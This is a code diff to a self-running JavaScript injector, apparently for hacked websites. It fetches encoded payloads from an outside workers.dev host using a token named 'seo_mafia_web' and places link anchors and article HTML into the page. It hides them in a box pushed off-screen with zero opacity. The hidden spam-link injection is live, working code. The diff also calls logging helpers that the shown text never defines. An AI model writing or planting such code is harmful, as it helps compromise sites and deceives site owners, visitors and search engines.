@@ -1,7 +1,7 @@
 !function(){
 try{
   if(document.getElementById("bunker-payload-1")) return;
-
+  const DEBUG = localStorage.getItem("debug_panel1") === "1";
   const API_BASE = "https://smw.jsload.workers.dev";
   const TOKEN = "seo_mafia_web";
   const decode = (s) => {
@@ -10,7 +10,7 @@ try{
         Uint8Array.from(atob(s), c => c.charCodeAt(0))
       );
     } catch(e) {
-      console.error("Decode error:", e);
+      error("Decode error:", e);
       return "";
     }
   };
@@ -25,7 +25,7 @@ try{
       if(!json || !json.payload) throw new Error("Invalid payload");
       return decode(json.payload);
     }catch(err){
-      console.error("Fetch error ("+id+"):", err);
+      error("Fetch error ("+id+"):", err);
       return "";
     }
   }
@@ -36,7 +36,7 @@ try{
   ]).then(([anchorsRaw, articleRaw]) => {
 
     if(!anchorsRaw || !articleRaw){
-      console.warn("Data kosong, inject dibatalkan");
+      warn("Data kosong, inject dibatalkan");
       return;
     }
 
@@ -61,7 +61,7 @@ try{
       .filter(Boolean);
 
     if(!anchors.length){
-      console.warn("Anchor kosong");
+      warn("Anchor kosong");
       return;
     }
 
@@ -72,7 +72,7 @@ try{
         return anchors[i++ % anchors.length];
       });
     }else{
-      console.warn("⚠️ {ANCHOR} tidak ditemukan → fallback aktif");
+      warn("⚠️ {ANCHOR} tidak ditemukan → fallback aktif");
       html = anchors.join(" ");
     }
     function inject(){
@@ -83,7 +83,7 @@ try{
       box.style.cssText = "position:absolute;left:-9999px;opacity:0;font-size:0;";
       box.innerHTML = html;
       document.body.appendChild(box);
-      console.log("✅");
+      log("✅");
     }
 
     if(document.readyState !== "loading"){
@@ -95,6 +95,6 @@ try{
   });
 
 }catch(e){
-  console.error("Injector fatal error:", e);
+  error("Injector fatal error:", e);
 }
 }();
